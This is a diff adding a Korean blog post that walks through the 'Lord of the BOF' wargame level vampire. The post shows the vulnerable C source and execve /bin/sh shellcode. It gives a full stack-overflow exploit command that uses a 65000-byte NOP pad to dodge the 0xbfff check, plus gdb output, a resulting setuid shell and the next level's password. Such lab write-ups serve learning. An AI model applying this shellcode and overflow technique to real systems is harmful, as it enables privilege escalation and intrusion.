@@ -1,0 +1,96 @@
+---
+layout: post
+title:  "[LOB]Level09. vampire"
+subtitle:   "[LOB]troll → vampire"
+categories: writeup
+tags: lob vampire level09
+
+---
+
+# troll → vampire
+
+## keyword : check 0xbfff
+
+```c
+/*
+        The Lord of the BOF : The Fellowship of the BOF
+        - vampire
+        - check 0xbfff
+*/
+#include <stdio.h>
+#include <stdlib.h>
+
+main(int argc, char *argv[])
+{
+	char buffer[40];
+
+	if(argc < 2){
+		printf("argv error\n");
+		exit(0);
+	}
+
+	if(argv[1][47] != '\xbf')
+	{
+		printf("stack is still your friend.\n");
+		exit(0);
+	}
+
+    // here is changed!
+    if(argv[1][46] == '\xff')
+    {
+        printf("but it's not forever\n");
+        exit(0);
+    }
+
+	strcpy(buffer, argv[1]);
+	printf("%s\n", buffer);
+}
+```
+
+shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
+
+
+
+lret의 2번째 값이 '\xff'이면 안된다..;;
+
+그외에는 별거 없다.
+
+
+
+스택에서 버프의 위치가 0xbfff 영역에 존재하기 때문에 필터링에 걸릴 수 밖에 없다.
+
+따라서 argv[2]의 많음 값의 데이터를 넣어서 버퍼의 주소가 0xbfff영역을 벗어나게 만들어야 한다.
+
+```sh
+Starting program: /home/troll/./aampire `python -c 'print "A"*44+"\xff\xff\xbf\xbf"'` `python -c 'print "\x90"*65000'`
+
+Breakpoint 1, 0x80484b9 in main ()
+(gdb) x/32x $esp
+0xbffefcd8:	0xbffefce0	0xbffefe63	0x41414141	0x41414141
+0xbffefce8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffefcf8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffefd08:	0x41414141	0xbfbfffff	0x00000000	0xbffefd54
+0xbffefd18:	0xbffefd64	0x40013868	0x00000003	0x08048380
+0xbffefd28:	0x00000000	0x080483a1	0x08048430	0x00000003
+0xbffefd38:	0xbffefd54	0x080482e0	0x080484fc	0x4000ae60
+0xbffefd48:	0xbffefd4c	0x40013e90	0x00000003	0xbffefe4d
+```
+
+argv[2]에 NULL값을 65000개 넣었더니 esp값이 0xbffe영역을 가리키고 있다.
+
+
+
+```sh
+[troll@localhost troll]$ ./vampire `python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"A"*20+"\xe0\xfc\xfe\xbf"'` `python -c 'print "\x90"*65000'`
+1�Ph//shh/bin��PS�ᙰ
+                    ̀AAAAAAAAAAAAAAAAAAAA����
+bash$ my-pass
+euid = 509
+music world
+bash$ id
+uid=508(troll) gid=508(troll) euid=509(vampire) egid=509(vampire) groups=508(troll)
+```
+
+
+
+##### **vampire / music world**
